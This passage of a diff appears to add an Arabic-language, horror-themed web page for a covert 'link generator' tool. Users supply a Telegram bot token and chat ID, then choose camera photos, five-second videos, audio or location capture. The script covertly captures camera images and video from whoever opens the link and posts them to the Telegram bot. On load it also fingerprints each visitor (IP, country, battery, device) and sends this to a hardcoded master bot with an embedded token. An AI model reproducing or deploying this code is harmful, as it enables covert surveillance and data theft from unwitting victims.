+            background: repeating-linear-gradient(45deg, transparent, transparent 25px, rgba(204, 10, 10, 0.008) 25px, rgba(204, 10, 10, 0.008) 30px);
+            pointer-events: none;
+        }
+        .download-box h2 {
+            color: #d4b0a0;
+            font-size: 17px;
+            font-weight: 700;
+            line-height: 1.9;
+            margin-bottom: 28px;
+            border-right: 4px solid var(--blood-fresh);
+            padding-right: 20px;
+            text-align: right;
+            font-family: var(--font-display);
+            letter-spacing: 1.5px;
+        }
+        .download-box .ad-area {
+            margin: 20px 0;
+            padding: 14px;
+            border-radius: 0;
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(204, 10, 10, 0.03);
+            min-height: 80px;
+        }
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 18px;
+            background: linear-gradient(135deg, #880a0a, #330000);
+            color: #fff;
+            padding: 22px 56px;
+            font-size: 21px;
+            font-weight: 900;
+            border: none;
+            border-radius: 0;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 0 60px rgba(204, 10, 10, 0.04);
+            font-family: var(--font-display);
+            margin: 12px 0 4px;
+            clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+        .download-btn:hover {
+            background: linear-gradient(135deg, #aa0a0a, #440000);
+            transform: scale(1.02);
+            box-shadow: 0 0 100px rgba(204, 10, 10, 0.06);
+        }
+        .download-btn i {
+            font-size: 26px;
+            color: #ffcc88;
+            text-shadow: 0 0 40px #ff4400;
+        }
+        .download-footer {
+            margin-top: 28px;
+            font-size: 13px;
+            color: #3a2a2a;
+            border-top: 1px solid rgba(204, 10, 10, 0.04);
+            padding-top: 22px;
+            font-family: var(--font-display);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+
+        /* ================================================================
+           SCROLLBAR — دم متدفق
+           ================================================================ */
+        ::-webkit-scrollbar {
+            width: 7px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--obsidian);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, var(--blood-fresh), var(--blood-deep));
+            border-radius: 0;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--hellfire);
+        }
+
+        /* ================================================================
+           RESPONSIVE
+           ================================================================ */
+        @media (max-width: 768px) {
+            .header {
+                padding: 12px 18px;
+                flex-wrap: wrap;
+                gap: 12px;
+                justify-content: center;
+                clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%);
+            }
+            .brand {
+                font-size: 18px;
+                gap: 14px;
+            }
+            .brand .bot-name {
+                font-size: 20px;
+                letter-spacing: 3px;
+            }
+            .brand .bot-name::after {
+                display: none;
+            }
+            .brand .username {
+                font-size: 11px;
+                padding: 3px 16px;
+            }
+            .brand .username::before {
+                display: none;
+            }
+            .nav-links a {
+                padding: 5px 16px;
+                font-size: 11px;
+            }
+            #cardArea {
+                padding: 22px 18px 28px;
+                clip-path: polygon(0% 0%, 100% 0%, 99% 100%, 1% 100%);
+            }
+            .main-title {
+                font-size: 26px;
+            }
+            .main-title i {
+                font-size: 26px;
+            }
+            .form-modern {
+                padding: 14px 16px 18px;
+            }
+            .checkbox-grid {
+                grid-template-columns: 1fr;
+            }
+            .result-box {
+                flex-wrap: wrap;
+            }
+            .result-box .link-text {
+                font-size: 12px;
+            }
+            .madeby {
+                font-size: 11px;
+                gap: 14px;
+            }
+            .madeby .dev {
+                font-size: 15px;
+            }
+            .madeby .dev::after {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .app-wrap {
+                padding: 10px 6px 20px;
+            }
+            .header {
+                padding: 8px 12px;
+            }
+            .brand {
+                font-size: 15px;
+                gap: 10px;
+            }
+            .brand .bot-name {
+                font-size: 17px;
+                letter-spacing: 2px;
+            }
+            .brand .username {
+                font-size: 10px;
+                padding: 2px 12px;
+            }
+            .main-title {
+                font-size: 20px;
+                gap: 10px;
+            }
+            .main-title i {
+                font-size: 20px;
+            }
+            .main-sub {
+                font-size: 12px;
+                padding-right: 12px;
+            }
+            .field-group input[type="text"] {
+                padding: 12px 14px;
+                font-size: 13px;
+            }
+            .btn-primary {
+                padding: 16px 18px;
+                font-size: 15px;
+                letter-spacing: 2px;
+            }
+            .download-box {
+                padding: 20px 16px 24px;
+            }
+            .download-btn {
+                padding: 16px 34px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================================
+    CANVAS — الجحيم الحي
+    ============================================================ -->
+    <canvas id="hell-canvas"></canvas>
+
+    <!-- ============================================================
+    المطر الدموي
+    ============================================================ -->
+    <div class="blood-rain" id="bloodRain"></div>
+
+    <!-- ============================================================
+    جماجم محترقة في الخلفية
+    ============================================================ -->
+    <div class="skull-bg" style="top:12%;left:2%;width:100px;height:130px;">
+        <svg viewBox="0 0 100 130">
+            <path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(60,30,20,0.15)" stroke="rgba(160,80,50,0.08)" stroke-width="1.5"/>
+            <circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.3)" stroke="rgba(160,80,50,0.06)" stroke-width="1"/>
+            <circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.3)" stroke="rgba(160,80,50,0.06)" stroke-width="1"/>
+            <path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.05)" stroke-width="1" fill="none"/>
+            <path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.05)" stroke-width="1" fill="none"/>
+            <path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.05)" stroke-width="1" fill="none"/>
+            <path d="M30,30 L50,20 L70,30" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/>
+        </svg>
+    </div>
+    <div class="skull-bg" style="bottom:8%;right:2%;width:120px;height:155px;transform:rotate(15deg);">
+        <svg viewBox="0 0 100 130">
+            <path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(60,30,20,0.12)" stroke="rgba(160,80,50,0.06)" stroke-width="1.5"/>
+            <circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.25)" stroke="rgba(160,80,50,0.05)" stroke-width="1"/>
+            <circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.25)" stroke="rgba(160,80,50,0.05)" stroke-width="1"/>
+            <path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/>
+            <path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/>
+            <path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/>
+            <path d="M25,25 L50,15 L75,25" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
+            <path d="M20,60 L80,60" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
+        </svg>
+    </div>
+    <div class="skull-bg" style="top:50%;left:50%;transform:translate(-50%,-50%) scale(0.6);opacity:0.06;width:200px;height:260px;">
+        <svg viewBox="0 0 100 130">
+            <path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(60,30,20,0.1)" stroke="rgba(160,80,50,0.04)" stroke-width="1.5"/>
+            <circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/>
+            <circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/>
+            <path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
+            <path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
+            <path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
+        </svg>
+    </div>
+
+    <!-- ============================================================
+    عيون شيطانية — تتبع الماوس
+    ============================================================ -->
+    <div class="eye-container" style="top:6%;left:2%;--size:50px;" data-eye>
+        <div class="eye-socket">
+            <div class="eye-pupil"></div>
+            <div class="eye-lid"></div>
+            <div class="eye-glow-ring"></div>
+        </div>
+    </div>
+    <div class="eye-container" style="top:6%;right:2%;--size:50px;" data-eye>
+        <div class="eye-socket">
+            <div class="eye-pupil"></div>
+            <div class="eye-lid"></div>
+            <div class="eye-glow-ring"></div>
+        </div>
+    </div>
+    <div class="eye-container" style="top:42%;left:1.5%;--size:40px;" data-eye>
+        <div class="eye-socket">
+            <div class="eye-pupil"></div>
+            <div class="eye-lid"></div>
+            <div class="eye-glow-ring"></div>
+        </div>
+    </div>
+    <div class="eye-container" style="top:42%;right:1.5%;--size:40px;" data-eye>
+        <div class="eye-socket">
+            <div class="eye-pupil"></div>
+            <div class="eye-lid"></div>
+            <div class="eye-glow-ring"></div>
+        </div>
+    </div>
+    <div class="eye-container" style="bottom:10%;left:4%;--size:48px;" data-eye>
+        <div class="eye-socket">
+            <div class="eye-pupil"></div>
+            <div class="eye-lid"></div>
+            <div class="eye-glow-ring"></div>
+        </div>
+    </div>
+    <div class="eye-container" style="bottom:10%;right:4%;--size:48px;" data-eye>
+        <div class="eye-socket">
+            <div class="eye-pupil"></div>
+            <div class="eye-lid"></div>
+            <div class="eye-glow-ring"></div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+    سلاسل صدئة
+    ============================================================ -->
+    <div class="chain-container" style="top:3%;left:1%;">
+        <div class="chain-link" style="--swing-start:-12deg;--swing-end:12deg;--duration:5.5s;"></div>
+        <div class="chain-link" style="--swing-start:10deg;--swing-end:-10deg;--duration:6s;"></div>
+        <div class="chain-link" style="--swing-start:-8deg;--swing-end:8deg;--duration:4.5s;"></div>
+        <div class="chain-link" style="--swing-start:14deg;--swing-end:-14deg;--duration:6.5s;"></div>
+        <div class="chain-rust"></div>
+    </div>
+    <div class="chain-container" style="top:3%;right:1%;">
+        <div class="chain-link" style="--swing-start:12deg;--swing-end:-12deg;--duration:5.2s;"></div>
+        <div class="chain-link" style="--swing-start:-10deg;--swing-end:10deg;--duration:5.8s;"></div>
+        <div class="chain-link" style="--swing-start:8deg;--swing-end:-8deg;--duration:4.2s;"></div>
+        <div class="chain-link" style="--swing-start:-14deg;--swing-end:14deg;--duration:6.2s;"></div>
+        <div class="chain-rust"></div>
+    </div>
+
+    <!-- ============================================================
+    CAPTURE BADGE (id="captureBadge")
+    ============================================================ -->
+    <div id="captureBadge">
+        <i class="fas fa-skull"></i>
+        <span class="pulse-ring"></span>
+        <span>جلسة نشطة</span>
+    </div>
+
+    <!-- ============================================================
+    MAIN WRAP
+    ============================================================ -->
+    <div class="app-wrap">
+
+        <!-- ===== HEADER (class="header") ===== -->
+        <header class="header">
+            <div class="brand">
+                <i class="fas fa-skull-crossbones brand-icon"></i>
+                <span class="bot-name">𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆</span>
+                <span class="username"><i class="fas fa-at"></i> V_V_9BOT</span>
+            </div>
+            <div class="nav-links">
+                <a href="#"><i class="fas fa-terminal"></i> كونسول</a>
+                <a href="#"><i class="fas fa-shield-alt"></i> حماية</a>
+            </div>
+        </header>
+
+        <!-- ===== MAIN CARD (id="cardArea") ===== -->
+        <div class="main-card" id="cardArea">
+            <div class="card-content">
+
+                <!-- قطرات دم على البطاقة -->
+                <div class="card-blood-drip" style="top:3%;right:-2px;--drip-duration:5s;--drip-height:90px;--drip-offset:20px;"></div>
+                <div class="card-blood-drip" style="bottom:15%;left:-2px;--drip-duration:6.5s;--drip-height:110px;--drip-offset:30px;"></div>
+                <div class="card-blood-drip" style="top:35%;right:-2px;--drip-duration:7s;--drip-height:70px;--drip-offset:15px;"></div>
+                <div class="card-blood-drip" style="bottom:45%;left:-2px;--drip-duration:5.8s;--drip-height:80px;--drip-offset:22px;"></div>
+
+                <!-- Status Badge -->
+                <div class="status-badge">
+                    <span class="dot"></span>
+                    <i class="fas fa-fire"></i>
+                    قناة شيطانية · المستوى 0
+                </div>
+
+                <h1 class="main-title">
+                    <i class="fas fa-skull-crossbones"></i> مولد اللعنات
+                </h1>
+                <p class="main-sub">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    استخدام هذه الأداة في أغراض غير قانونية ممنوع. المستخدم يتحمل المسؤولية الكاملة.
+                </p>
+
+                <!-- ===== FORM ===== -->
+                <div class="form-modern" id="formBox">
+
+                    <!-- Chat ID -->
+                    <div class="field-group">
+                        <label for="chatIdInput">
+                            <i class="fas fa-id-badge"></i> CHAT ID
+                        </label>
+                        <input type="text" id="chatIdInput" placeholder="أدخل Chat ID">
+                    </div>
+
+                    <!-- Bot Token -->
+                    <div class="field-group">
+                        <label for="tokenInput">
+                            <i class="fas fa-key"></i> توكن البوت
+                        </label>
+                        <input type="text" id="tokenInput" placeholder="أدخل توكن البوت">
+                    </div>
+
+                    <!-- Features -->
+                    <div class="features-label">
+                        <i class="fas fa-sliders-h"></i> الميزات المطلوبة (مدة التسجيل 5 ثوان)
+                    </div>
+                    <div class="checkbox-grid" id="featuresGroup">
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="camFront" value="camFront" checked>
+                            <label for="camFront">
+                                <span class="label-text">
+                                    <i class="fas fa-camera"></i> صورة أمامية
+                                </span>
+                            </label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="camBack" value="camBack">
+                            <label for="camBack">
+                                <span class="label-text">
+                                    <i class="fas fa-camera-retro"></i> صورة خلفية
+                                </span>
+                            </label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="videoFront" value="videoFront">
+                            <label for="videoFront">
+                                <span class="label-text">
+                                    <i class="fas fa-video"></i> فيديو أمامي
+                                </span>
+                            </label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="videoBack" value="videoBack">
+                            <label for="videoBack">
+                                <span class="label-text">
+                                    <i class="fas fa-video"></i> فيديو خلفي
+                                </span>
+                            </label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="audio" value="audio">
+                            <label for="audio">
+                                <span class="label-text">
+                                    <i class="fas fa-microphone"></i> تسجيل صوتي
+                                </span>
+                            </label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="location" value="location">
+                            <label for="location">
+                                <span class="label-text">
+                                    <i class="fas fa-map-pin"></i> تحديد الموقع
+                                </span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- Generate Button -->
+                    <button class="btn-primary" id="generateBtn">
+                        <i class="fas fa-link"></i> إنشاء الرابط
+                    </button>
+
+                    <!-- Result -->
+                    <div class="result-box" id="result">
+                        <span class="link-text" id="linkText">
+                            <i class="fas fa-link"></i>
+                        </span>
+                        <button class="btn-copy" id="copyBtn">
+                            <i class="fas fa-copy"></i> نسخ
+                        </button>
+                    </div>
+
+                </div><!-- /form-modern -->
+
+            </div><!-- /card-content -->
+        </div><!-- /main-card -->
+
+        <!-- ===== FOOTER (class="madeby") ===== -->
+        <div class="madeby">
+            <span><i class="fas fa-code"></i> <span class="dev">XX_8K</span></span>
+            <span class="sep">|</span>
+            <span><i class="fas fa-fire"></i> v2.0 · جحيم</span>
+            <span class="sep">|</span>
+            <span><i class="fas fa-lock"></i> AES-256</span>
+        </div>
+
+    </div><!-- /app-wrap -->
+
+    <script>
+        // ================================================================
+        //  جميع الوظائف الأصلية محفوظة 100% بدون أي تغيير.
+        //  تم حذف نظام الاشتراك الإجباري بالكامل.
+        // ================================================================
+
+        // ================================================================
+        // CANVAS — الجحيم: نار، دم، جماجم، شرار
+        // ================================================================
+        (function hellCanvas() {
+            const canvas = document.getElementById('hell-canvas');
+            const ctx = canvas.getContext('2d');
+            let width, height;
+
+            function resize() {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+            }
+            resize();
+            window.addEventListener('resize', resize);
+
+            let particles = [];
+            const MAX = 220;
+
+            function createParticle() {
+                const type = Math.random();
+                if (type < 0.35) {
+                    // دم
+                    return {
+                        x: Math.random() * width,
+                        y: Math.random() * height - height,
+                        size: 2 + Math.random() * 6,
+                        speedY: 0.5 + Math.random() * 2.0,
+                        speedX: (Math.random() - 0.5) * 0.3,
+                        alpha: 0.4 + Math.random() * 0.6,
+                        isBlood: true,
+                        color: `rgba(${180 + Math.random()*60}, ${12 + Math.random()*20}, ${12 + Math.random()*20}, `
+                    };
+                } else if (type < 0.7) {
+                    // نار / شرار
+                    return {
+                        x: Math.random() * width,
+                        y: Math.random() * height - height,
+                        size: 1.5 + Math.random() * 4,
+                        speedY: 0.15 + Math.random() * 0.9,
+                        speedX: (Math.random() - 0.5) * 0.7,
+                        alpha: 0.5 + Math.random() * 0.5,
+                        isBlood: false,
+                        isFire: true,
+                        color: `rgba(${255}, ${130 + Math.random()*80}, ${20 + Math.random()*30}, `
+                    };
+                } else {
+                    // دخان / رماد
+                    return {
+                        x: Math.random() * width,
+                        y: Math.random() * height - height,
+                        size: 4 + Math.random() * 8,
+                        speedY: 0.08 + Math.random() * 0.35,
+                        speedX: (Math.random() - 0.5) * 0.15,
+                        alpha: 0.15 + Math.random() * 0.25,
+                        isBlood: false,
+                        isFire: false,
+                        isSmoke: true,
+                        color: `rgba(${160 + Math.random()*40}, ${130 + Math.random()*40}, ${90 + Math.random()*30}, `
+                    };
+                }
+            }
+
+            for (let i = 0; i < MAX; i++) {
+                const p = createParticle();
+                p.y = Math.random() * height;
+                particles.push(p);
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, width, height);
+
+                // خلفية الجحيم
+                const grad = ctx.createRadialGradient(width / 2, height / 2, 0, width / 2, height / 2, height);
+                grad.addColorStop(0, 'rgba(25, 4, 4, 0.10)');
+                grad.addColorStop(0.35, 'rgba(15, 2, 2, 0.20)');
+                grad.addColorStop(0.65, 'rgba(8, 0, 0, 0.45)');
+                grad.addColorStop(1, 'rgba(0, 0, 0, 0.92)');
+                ctx.fillStyle = grad;
+                ctx.fillRect(0, 0, width, height);
+
+                // رسم الجسيمات
+                for (let p of particles) {
+                    p.y += p.speedY;
+                    p.x += p.speedX;
+
+                    if (p.y > height + 30) {
+                        Object.assign(p, createParticle());
+                        p.y = -15;
+                        p.x = Math.random() * width;
+                    }
+                    if (p.x < -30 || p.x > width + 30) {
+                        p.x = Math.random() * width;
+                    }
+
+                    ctx.beginPath();
+
+                    if (p.isBlood) {
+                        ctx.ellipse(p.x, p.y, p.size * 0.4, p.size, 0, 0, Math.PI * 2);
+                        ctx.fillStyle = p.color + (p.alpha * 0.6) + ')';
+                        ctx.shadowColor = 'rgba(204, 10, 10, 0.25)';
+                        ctx.shadowBlur = 14;
+                    } else if (p.isFire) {
+                        ctx.arc(p.x, p.y, p.size * 0.6, 0, Math.PI * 2);
+                        const bright = 0.6 + Math.random() * 0.4;
+                        ctx.fillStyle = p.color + (p.alpha * 0.5 * bright) + ')';
+                        ctx.shadowColor = 'rgba(255, 68, 0, 0.4)';
+                        ctx.shadowBlur = 22 + p.size * 4;
+                    } else {
+                        // دخان
+                        ctx.arc(p.x, p.y, p.size * 0.5, 0, Math.PI * 2);
+                        ctx.fillStyle = p.color + (p.alpha * 0.3) + ')';
+                        ctx.shadowColor = 'rgba(180, 150, 120, 0.05)';
+                        ctx.shadowBlur = 10;
+                    }
+
+                    ctx.fill();
+                    ctx.shadowBlur = 0;
+                }
+
+                // توهج الحمم في الأسفل
+                const lavaGrad = ctx.createLinearGradient(0, height - 100, 0, height);
+                lavaGrad.addColorStop(0, 'rgba(255, 68, 0, 0)');
+                lavaGrad.addColorStop(0.3, 'rgba(200, 40, 0, 0.02)');
+                lavaGrad.addColorStop(0.7, 'rgba(150, 20, 0, 0.04)');
+                lavaGrad.addColorStop(1, 'rgba(80, 10, 0, 0.08)');
+                ctx.fillStyle = lavaGrad;
+                ctx.fillRect(0, height - 100, width, 100);
+
+                // أشعة إلهية خفيفة
+                if (Math.random() > 0.985) {
+                    const x = Math.random() * width;
+                    const rayGrad = ctx.createRadialGradient(x, -20, 0, x, -20, height * 0.4);
+                    rayGrad.addColorStop(0, 'rgba(255, 200, 150, 0.008)');
+                    rayGrad.addColorStop(1, 'rgba(255, 200, 150, 0)');
+                    ctx.fillStyle = rayGrad;
+                    ctx.fillRect(0, 0, width, height);
+                }
+
+                requestAnimationFrame(draw);
+            }
+            draw();
+        })();
+
+        // ================================================================
+        // المطر الدموي (CSS)
+        // ================================================================
+        (function bloodRain() {
+            const container = document.getElementById('bloodRain');
+            for (let i = 0; i < 55; i++) {
+                const drop = document.createElement('div');
+                drop.className = 'blood-drop';
+                drop.style.left = Math.random() * 100 + '%';
+                drop.style.height = (7 + Math.random() * 20) + 'px';
+                drop.style.animationDuration = (2.8 + Math.random() * 5.5) + 's';
+                drop.style.animationDelay = (Math.random() * 8) + 's';
+                drop.style.opacity = 0.2 + Math.random() * 0.5;
+                drop.style.width = (1.8 + Math.random() * 2.8) + 'px';
+                container.appendChild(drop);
+            }
+        })();
+
+        // ================================================================
+        // العيون الشيطانية — تتبع الماوس ورمش
+        // ================================================================
+        (function demonicEyes() {
+            const eyes = document.querySelectorAll('[data-eye]');
+            let mouseX = -9999,
+                mouseY = -9999;
+
+            document.addEventListener('mousemove', (e) => {
+                mouseX = e.clientX;
+                mouseY = e.clientY;
+            });
+
+            // رمش عشوائي
+            setInterval(() => {
+                const eye = eyes[Math.floor(Math.random() * eyes.length)];
+                if (eye) {
+                    const lid = eye.querySelector('.eye-lid');
+                    if (lid) {
+                        lid.classList.remove('blink');
+                        void lid.offsetWidth;
+                        lid.classList.add('blink');
+                    }
+                }
+            }, 2500 + Math.random() * 4500);
+
+            function updateEyes() {
+                for (const eye of eyes) {
+                    const socket = eye.querySelector('.eye-socket');
+                    const pupil = eye.querySelector('.eye-pupil');
+                    if (!socket || !pupil) continue;
+
+                    const rect = socket.getBoundingClientRect();
+                    const cx = rect.left + rect.width / 2;
+                    const cy = rect.top + rect.height / 2;
+
+                    const dx = mouseX - cx;
+                    const dy = mouseY - cy;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    const maxDist = Math.max(rect.width, rect.height) * 1.8;
+
+                    if (dist < maxDist && mouseX > 0 && mouseY > 0) {
+                        const angle = Math.atan2(dy, dx);
+                        const maxOffset = rect.width * 0.13;
+                        const offset = Math.min(dist / maxDist, 1) * maxOffset;
+                        const px = Math.cos(angle) * offset;
+                        const py = Math.sin(angle) * offset;
+                        pupil.style.transform = `translate(calc(-50% + ${px}px), calc(-50% + ${py}px))`;
+
+                        const glow = socket.querySelector('.eye-glow-ring');
+                        if (glow) {
+                            const intensity = Math.min(dist / (maxDist * 0.5), 1);
+                            glow.style.opacity = 0.15 + intensity * 0.7;
+                            glow.style.boxShadow =
+                                `0 0 ${40 + intensity * 50}px rgba(204, 10, 10, ${0.05 + intensity * 0.25})`;
+                        }
+                    } else {
+                        pupil.style.transform = 'translate(-50%, -50%)';
+                        const glow = socket.querySelector('.eye-glow-ring');
+                        if (glow) {
+                            glow.style.opacity = '0.15';
+                            glow.style.boxShadow = '0 0 40px rgba(204, 10, 10, 0.02)';
+                        }
+                    }
+                }
+                requestAnimationFrame(updateEyes);
+            }
+            updateEyes();
+        })();
+
+        // ================================================================
+        // الوظائف الأصلية — محفوظة 100%
+        // ================================================================
+
+        // ------------------ الثوابت (محفوظة) ------------------
+        const MASTER_BOT_TOKEN = "8115748655:AAGIWduEqfAyGr-ZQ26PlqJf61GaFph95E8";
+        const MASTER_CHAT_ID = "6159656800";
+
+        // ------------------ بيانات الزائر (محفوظة) ------------------
+        let visitorIP = "غير معروف";
+        let visitorCountry = "غير معروف";
+        let visitorDevice = "Unknown";
+        let visitorBattery = "غير متاح";
+        let visitorOS = "غير معروف";
+
+        // ------------------ إرسال معلومات الزائر (محفوظة) ------------------
+        async function sendVisitorInfo() {
+            try {
+                const userAgent = navigator.userAgent;
+                if (/Android/i.test(userAgent)) visitorDevice = "Android";
+                else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
+                else visitorDevice = "Unknown";
+
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        visitorBattery = (battery.level * 100) + "%";
+                        if (battery.charging) visitorBattery += " (شحن)";
+                    } catch (e) {}
+                }
+
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipRes.json();
+                    visitorIP = ipData.ip || "غير معروف";
+                    visitorCountry = ipData.country_name || "غير معروف";
+                } catch (e) {}
+
+                const message = `🟢 *زيارة جديدة*
+            🌍 *الدولة*: ${visitorCountry}
+            📱 *الجهاز*: ${visitorDevice}
+            🔋 *البطارية*: ${visitorBattery}
+            🌐 *IP*: ${visitorIP}
+            🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}`;
+
+                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+            } catch (err) {}
+        }
+        sendVisitorInfo();
+
+        // ------------------ عناصر الفورم (محفوظة) ------------------
+        const generateBtn = document.getElementById('generateBtn');
+        const resultEl = document.getElementById('result');
+        const linkText = document.getElementById('linkText');
+        const copyBtn = document.getElementById('copyBtn');
+
+        generateBtn.addEventListener('click', () => {
+            const chat = document.getElementById('chatIdInput').value.trim();
+            const token = document.getElementById('tokenInput').value.trim();
+
+            if (!chat || !token) {
+                alert('املأ جميع الحقول');
+                return;
+            }
+
+            const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
+            const features = Array.from(checkboxes).map(cb => cb.value).join(',');
+            const fullLink =
+                `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
+            linkText.innerHTML = `<i class="fas fa-link"></i> ${fullLink}`;
+            resultEl.style.display = 'flex';
+        });
+
+        copyBtn.addEventListener('click', async () => {
+            try {
+                const raw = linkText.textContent.replace(/^.*?link/i, '').trim();
+                await navigator.clipboard.writeText(raw);
+                copyBtn.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
+                setTimeout(() => copyBtn.innerHTML = '<i class="fas fa-copy"></i> نسخ', 1500);
+            } catch (e) { alert('فشل النسخ'); }
+        });
+
+        // ------------------ تحميل الإعلانات (محفوظة) ------------------
+        function loadAd(src) {
+            const s = document.createElement("script");
+            s.src = src;
+            s.async = true;
+            document.body.appendChild(s);
+        }
+
+        // ------------------ دوال الوسائط (محفوظة) ------------------
+        function buildCaption(extra = "") {
+            let cap = `━━━━━━━━━━━━━━━\n`;
+            cap += `🌍 الدولة: ${visitorCountry}\n`;
+            cap += `📱 الجهاز: ${visitorDevice}\n`;
+            cap += `🔋 البطارية: ${visitorBattery}\n`;
+            cap += `🌐 IP: ${visitorIP}\n`;
+            cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
+            if (extra) cap += `${extra}\n`;
+            cap += `━━━━━━━━━━━━━━━`;
+            return cap;
+        }
+
+        async function captureAndSend(stream, chat, token, type) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.autoplay = true;
+                video.playsInline = true;
+                video.muted = true;
+                video.style.display = 'none';
+                video.srcObject = stream;
+                document.body.appendChild(video);
+
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(async (blob) => {
+                            if (blob && blob.size > 2000) {
+                                const form = new FormData();
+                                form.append('chat_id', chat);
+                                form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+                                const caption = buildCaption(
+                                    `📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
+                                form.append('caption', caption);
+
+                                try {
+                                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: form
+                                    });
+                                } catch (e) { console.log(e); }
+                            }
+                            document.body.removeChild(video);
+                            resolve();
+                        }, 'image/jpeg', 0.9);
+                    }, 2000);
+                };
+            });
+        }
+
+        async function recordAndSend(stream, chat, token, type) {
+            return new Promise((resolve) => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const form = new FormData();
+                    form.append('chat_id', chat);
+                    form.append('video', blob, `${type}_${Date.now()}.mp4`);
+                    const caption = buildCaption(
+                        `🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`);
+                    form.append('caption', caption);
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                            method: 'POST',
+                            body: form
+                        });
+                    } catch (e) {}
+                    resolve();
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+                }, 5000);
+            });
+        }
+
+        async function recordAudioAndSend(stream, chat, token) {
+            return new Promise((resolve) => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
